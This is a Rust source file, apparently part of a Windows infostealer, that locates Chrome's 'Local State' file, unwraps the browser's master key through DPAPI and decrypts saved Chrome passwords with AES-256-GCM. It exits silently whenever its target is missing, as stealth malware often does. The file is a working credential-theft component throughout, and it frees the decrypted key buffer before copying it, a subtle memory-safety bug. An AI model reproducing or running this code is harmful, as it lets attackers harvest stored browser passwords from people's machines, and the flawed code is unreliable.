use lazy_static::lazy_static;
use std::collections::HashMap;
use std::error::Error;
use std::path;

use {
    aes_gcm::aead::{Aead, NewAead},
    aes_gcm::{Aes256Gcm, Key, Nonce},
    serde_json as json,
    std::ptr,
    windows::Win32::{
        Security::Cryptography::{CryptUnprotectData, CRYPTOAPI_BLOB},
        System::Memory::LocalFree,
    },
};

lazy_static! {
    pub static ref HOME: String =
        std::env::var("USERPROFILE").unwrap_or_else(|_| std::process::exit(0));
    pub static ref PATHS: HashMap<&'static str, &'static str> =
        HashMap::from([("chrome", r"AppData\Local\Google\Chrome\User Data"),]);
}

fn read_master_key() -> Result<Vec<u8>, Box<dyn Error>> {
    let local_state_path = path::PathBuf::new()
        .join(HOME.as_str())
        .join(PATHS["chrome"])
        .join("Local State");

    let local_state = std::fs::read_to_string(local_state_path)?;
    let v: json::Value = json::from_str(&local_state)?;
    let key = &v["os_crypt"]["encrypted_key"];
    let secret_key_base64 = key.as_str().unwrap_or_default();

    let secret_key = base64::decode(secret_key_base64)?[5..].to_vec();

    Ok(secret_key)
}

unsafe fn decrypt_master_key(et_bytes: &mut [u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    let size = u32::try_from(et_bytes.len())?;

    let mut p_data_in = CRYPTOAPI_BLOB {
        cbData: size,
        pbData: et_bytes.as_mut_ptr(),
    };
    let mut p_data_out = CRYPTOAPI_BLOB::default();

    let pin = &mut p_data_in;
    let pout = &mut p_data_out;

    CryptUnprotectData(
        pin,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        pout,
    );

    if !p_data_out.pbData.is_null() {
        let output = std::slice::from_raw_parts(p_data_out.pbData, p_data_out.cbData as _);

        LocalFree(p_data_out.pbData as _);

        Ok(output.to_vec())
    } else {
        std::process::exit(0);
    }
}

pub fn decrypt_password(password: &[u8], key: &[u8]) -> Result<String, Box<dyn Error>> {
    let iv = &password[3..15];
    let payload = &password[15..];

    let nonce = Nonce::from_slice(iv);
    let aes_key = Key::from_slice(key);
    let cipher = Aes256Gcm::new(aes_key);

    let plaintext_vec = cipher.decrypt(nonce, payload).or(Err(""))?;
    let plaintext = String::from_utf8(plaintext_vec)?;
    Ok(plaintext)
}

pub fn get_master_key() -> Result<Vec<u8>, Box<dyn Error>> {
    let master_key;
    unsafe {
        let mut key = read_master_key()?;
        master_key = decrypt_master_key(&mut key)?;
    }
    Ok(master_key)
}
